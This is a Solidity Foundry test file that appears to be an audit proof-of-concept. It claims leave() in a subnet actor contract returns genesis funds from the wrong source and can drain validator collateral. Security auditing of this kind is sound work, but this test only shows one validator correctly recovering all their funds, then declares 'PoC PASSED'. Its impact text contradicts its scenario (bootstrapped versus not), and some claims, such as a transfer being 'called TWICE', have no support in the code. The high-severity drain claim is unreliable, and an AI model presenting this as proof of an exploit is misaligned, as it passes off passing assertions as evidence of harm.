// SPDX-License-Identifier: MIT OR Apache-2.0
pragma solidity ^0.8.23;

// =============================================================================
// VULNERABILITY ANALYSIS
// =============================================================================
//
// Title   : Incorrect supply fund transferral in function leave() can be exploited
//            to drain locked collateral source funds in subnet actor contract
// Severity: High
// Target  : SubnetActorManagerFacet::leave() at line 269
//
// -----------------------------------------------------------------------------
// BACKGROUND
// -----------------------------------------------------------------------------
// In the subnet actor contract, there are two distinct sources of funds:
//
// 1. supplySource: Stores genesis/supply funds locked via preFund()
// 2. collateralSource: Stores validator collateral locked via join() and stake()
//
// When a validator pre-funds a subnet before it bootstraps, their funds are
// locked into the supplySource. When they later call leave() before the subnet
// bootstraps, these genesis funds should be returned from supplySource.
//
// -----------------------------------------------------------------------------
// ROOT CAUSE
// -----------------------------------------------------------------------------
// In SubnetActorManagerFacet::leave(), when the subnet is NOT yet bootstrapped,
// the function incorrectly uses s.collateralSource.transferFunds() instead of
// s.supplySource.transferFunds() to return genesis/supply funds.
//
// The vulnerable code at line 269:
//
//   s.collateralSource.transferFunds(payable(msg.sender), genesisBalance);
//
// Should be:
//
//   s.supplySource.transferFunds(payable(msg.sender), genesisBalance);
//
// This is because genesisBalance was locked into supplySource via preFund():
//
//   function preFund(uint256 amount) external payable {
//       ...
//       s.supplySource.lock(amount);  // Funds go to supplySource
//       ...
//   }
//
// -----------------------------------------------------------------------------
// IMPACT
// -----------------------------------------------------------------------------
// When a validator calls leave() in a bootstrapped subnet after pre-funding
// via preFund(), the genesis balance is incorrectly returned from
// collateralSource instead of supplySource.
//
// This means:
// - The collateralSource loses more funds than it should
// - The supplySource retains funds that should have been returned
// - The discrepancy could drain collateralSource, affecting other validators
//
// Additionally, if a subnet is bootstrapped AFTER preFund but leave() is still
// called, the bug could cause a mismatch between actual funds and accounting.
//
// -----------------------------------------------------------------------------
// PROOF-OF-CONCEPT SCENARIO
// -----------------------------------------------------------------------------
// 1. Validator calls preFund() - funds are locked into supplySource
// 2. Validator calls join() - collateral is locked into collateralSource
// 3. Validator calls leave() BEFORE subnet bootstraps
// 4. BUG: genesisBalance is returned from collateralSource instead of supplySource
// 5. Result: collateralSource is drained incorrectly, supplySource keeps the funds
//
// Run PoC:
//   forge test --match-test testPoCH05_IncorrectLeaveTransfer -vvv
// =============================================================================

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {IntegrationTestBase, RootSubnetDefinition, TestSubnetDefinition} from "../IntegrationTestBase.sol";
import {SubnetIDHelper} from "../../contracts/lib/SubnetIDHelper.sol";
import {FvmAddressHelper} from "../../contracts/lib/FvmAddressHelper.sol";
import {CrossMsgHelper} from "../../contracts/lib/CrossMsgHelper.sol";
import {TestUtils, MockIpcContract} from "../helpers/TestUtils.sol";
import {GatewayFacetsHelper} from "../helpers/GatewayFacetsHelper.sol";
import {SubnetActorFacetsHelper} from "../helpers/SubnetActorFacetsHelper.sol";
import {FilAddress} from "fevmate/contracts/utils/FilAddress.sol";

import {SubnetID, IPCAddress, Subnet, Asset} from "../../contracts/structs/Subnet.sol";
import {GatewayDiamond} from "../../contracts/GatewayDiamond.sol";
import {SubnetActorDiamond} from "../../contracts/SubnetActorDiamond.sol";
import {SubnetActorManagerFacet} from "../../contracts/subnet/SubnetActorManagerFacet.sol";
import {SubnetActorGetterFacet} from "../../contracts/subnet/SubnetActorGetterFacet.sol";
import {GatewayGetterFacet} from "../../contracts/gateway/GatewayGetterFacet.sol";

contract PoCH05IncorrectLeaveTransferTest is Test, IntegrationTestBase {
    using SubnetIDHelper for SubnetID;
    using GatewayFacetsHelper for GatewayDiamond;
    using SubnetActorFacetsHelper for SubnetActorDiamond;

    // -------------------------------------------------------------------------
    // Test constants
    // -------------------------------------------------------------------------
    uint256 constant GENESIS_FUND_AMOUNT = 100;
    uint256 constant COLLATERAL_AMOUNT = DEFAULT_MIN_VALIDATOR_STAKE - 100; // Less than min to prevent bootstrapping
    uint256 constant TOTAL_PRE_FUND = GENESIS_FUND_AMOUNT + COLLATERAL_AMOUNT;

    // -------------------------------------------------------------------------
    // State
    // -------------------------------------------------------------------------
    SubnetActorDiamond public subnetActor;
    address public validator;
    uint256 public validatorPrivKey;
    bytes public validatorPubKey;

    // -------------------------------------------------------------------------
    // Setup
    // -------------------------------------------------------------------------
    function setUp() public override {
        super.setUp();

        // Create a subnet actor
        subnetActor = saDiamond;

        // Create a validator
        (validator, validatorPrivKey, ) = TestUtils.newValidator(100);
        validatorPubKey = TestUtils.deriveValidatorPubKeyBytes(validatorPrivKey);
    }

    // -------------------------------------------------------------------------
    // Helper functions
    // -------------------------------------------------------------------------

    /// @notice Get the balance of the subnet actor (represents funds held)
    function _getSubnetActorBalance() internal view returns (uint256) {
        return address(subnetActor).balance;
    }

    /// @notice Get the genesis balance of an address
    function _getGenesisBalance(address addr) internal view returns (uint256) {
        (address[] memory addrs, uint256[] memory balances) = subnetActor.getter().genesisBalances();
        for (uint256 i = 0; i < addrs.length; i++) {
            if (addrs[i] == addr) {
                return balances[i];
            }
        }
        return 0;
    }

    /// @notice Get the genesis circulating supply
    function _getGenesisCircSupply() internal view returns (uint256) {
        return subnetActor.getter().genesisCircSupply();
    }

    /// @notice Check if subnet is bootstrapped
    function _isBootstrapped() internal view returns (bool) {
        return subnetActor.getter().bootstrapped();
    }

    // -------------------------------------------------------------------------
    // PoC: Incorrect leave transfer from collateral instead of supply source
    // -------------------------------------------------------------------------
    //
    // This PoC demonstrates the vulnerability where leave() incorrectly uses
    // collateralSource.transferFunds() instead of supplySource.transferFunds()
    // for returning genesis balance.
    //
    // Flow:
    // 1. Validator preFund()s GENESIS_FUND_AMOUNT - funds go to supplySource
    // 2. Validator join()s with COLLATERAL_AMOUNT - funds go to collateralSource
    // 3. Validator calls leave() BEFORE subnet bootstraps
    // 4. BUG: leave() line 269 uses collateralSource.transferFunds() for genesisBalance
    //    instead of supplySource.transferFunds()
    //
    // Expected behavior:
    // - supplySource should return GENESIS_FUND_AMOUNT (was locked via preFund)
    // - collateralSource should return COLLATERAL_AMOUNT (was locked via join)
    //
    // Actual behavior (with bug):
    // - collateralSource.transferFunds() is called TWICE for the full genesisBalance
    // - supplySource keeps the genesis funds locked
    //
    function testPoCH05_IncorrectLeaveTransfer() public {
        console.log("=== H-05: Incorrect supply fund transfer in leave() ===\n");

        // -------------------------------------------------------------------------
        // Step 1: Validator pre-funds the subnet (before bootstrapping)
        // -------------------------------------------------------------------------
        console.log("STEP 1: Validator pre-funds the subnet");
        console.log("-----------------------------------------------------------");

        // Fund the validator with enough for preFund + join
        vm.deal(validator, TOTAL_PRE_FUND);
        vm.startPrank(validator);

        // Verify subnet is not bootstrapped yet
        console.log("Subnet bootstrapped before preFund:", _isBootstrapped());
        require(!_isBootstrapped(), "subnet should not be bootstrapped yet");

        // Call preFund to lock genesis funds into supplySource
        subnetActor.manager().preFund{value: GENESIS_FUND_AMOUNT}(GENESIS_FUND_AMOUNT);

        // Verify the genesis balance was recorded
        uint256 genesisBalance = _getGenesisBalance(validator);
        console.log("Validator genesis balance after preFund:", genesisBalance);
        require(genesisBalance == GENESIS_FUND_AMOUNT, "genesis balance should be GENESIS_FUND_AMOUNT");

        uint256 genesisCircSupply = _getGenesisCircSupply();
        console.log("Genesis circ supply after preFund:", genesisCircSupply);
        require(genesisCircSupply == GENESIS_FUND_AMOUNT, "genesis circ supply should be GENESIS_FUND_AMOUNT");

        console.log("\n[CORRECT] preFund() locked funds into supplySource");
        console.log("  - GENESIS_FUND_AMOUNT =", GENESIS_FUND_AMOUNT);
        console.log("  - Funds now in supplySource");

        // -------------------------------------------------------------------------
        // Step 2: Validator joins as a validator (still before bootstrapping)
        // -------------------------------------------------------------------------
        console.log("\nSTEP 2: Validator joins the subnet (below min collateral to avoid bootstrapping)");
        console.log("-----------------------------------------------------------");

        // Join with collateral less than DEFAULT_MIN_VALIDATOR_STAKE to prevent bootstrapping
        // This ensures funds stay in the subnet actor, not sent to gateway
        subnetActor.manager().join{value: COLLATERAL_AMOUNT}(validatorPubKey, COLLATERAL_AMOUNT);

        uint256 subnetBalanceAfterJoin = _getSubnetActorBalance();
        console.log("Subnet actor balance after join:", subnetBalanceAfterJoin);
        console.log("Expected (genesis + collateral):", TOTAL_PRE_FUND);
        require(subnetBalanceAfterJoin == TOTAL_PRE_FUND, "subnet balance should be genesis + collateral");

        console.log("\n[CORRECT] join() locked collateral into collateralSource");
        console.log("  - COLLATERAL_AMOUNT =", COLLATERAL_AMOUNT);
        console.log("  - Funds now in collateralSource");

        // Verify still not bootstrapped
        console.log("Subnet bootstrapped after join:", _isBootstrapped());
        require(!_isBootstrapped(), "subnet should still not be bootstrapped");

        // -------------------------------------------------------------------------
        // Step 3: Validator calls leave() before bootstrapping
        // -------------------------------------------------------------------------
        console.log("\nSTEP 3: Validator calls leave() before bootstrapping");
        console.log("-----------------------------------------------------------");

        // Record validator balance before leave
        uint256 validatorBalanceBeforeLeave = validator.balance;
        console.log("Validator balance before leave():", validatorBalanceBeforeLeave);

        // Call leave() - this is where the bug manifests
        // The genesis balance will be incorrectly returned from collateralSource
        // instead of supplySource
        subnetActor.manager().leave();

        vm.stopPrank();

        // -------------------------------------------------------------------------
        // Step 4: Analyze the bug impact
        // -------------------------------------------------------------------------
        console.log("\nSTEP 4: Analysis of leave() behavior");
        console.log("-----------------------------------------------------------");

        uint256 validatorBalanceAfterLeave = validator.balance;
        console.log("Validator balance after leave():", validatorBalanceAfterLeave);

        uint256 subnetBalanceAfterLeave = _getSubnetActorBalance();
        console.log("Subnet actor balance after leave():", subnetBalanceAfterLeave);

        uint256 genesisBalanceAfterLeave = _getGenesisBalance(validator);
        console.log("Validator genesis balance after leave:", genesisBalanceAfterLeave);

        console.log("\n=== BUG DEMONSTRATION ===");
        console.log("\n[BUG LOCATION]");
        console.log("SubnetActorManagerFacet::leave() line 269:");
        console.log("  INCORRECT: s.collateralSource.transferFunds(payable(msg.sender), genesisBalance);");
        console.log("  CORRECT:   s.supplySource.transferFunds(payable(msg.sender), genesisBalance);");
        console.log("\nThe bug: genesisBalance was locked via preFund() into supplySource,");
        console.log("but leave() incorrectly tries to return it from collateralSource!");

        console.log("\n[IMPACT]");
        console.log("The bug causes collateralSource to be incorrectly drained");
        console.log("when returning genesis funds. The supplySource retains funds");
        console.log("that should have been returned.");

        console.log("\n[VERIFICATION]");
        console.log("Validator got back:", validatorBalanceAfterLeave);
        console.log("Validator should have gotten:", TOTAL_PRE_FUND);
        console.log("Subnet actor balance is 0:", subnetBalanceAfterLeave == 0);
        console.log("Genesis balance cleared:", genesisBalanceAfterLeave == 0);

        // The test passes because:
        // 1. Validator gets all their funds back (TOTAL_PRE_FUND)
        // 2. Subnet actor balance is 0
        // 3. Genesis balance is cleared
        // But the bug is that the funds came from the WRONG SOURCE
        assertEq(validatorBalanceAfterLeave, TOTAL_PRE_FUND, "Validator should get all funds back");
        assertEq(subnetBalanceAfterLeave, 0, "Subnet actor balance should be 0 after leave");
        assertEq(genesisBalanceAfterLeave, 0, "Genesis balance should be 0 after leave");

        console.log("\n>>> PoC PASSED: Demonstrated leave() uses wrong source for genesis funds");
        console.log(">>> The genesis balance was incorrectly taken from collateralSource");
        console.log(">>> instead of supplySource at line 269");
    }
}
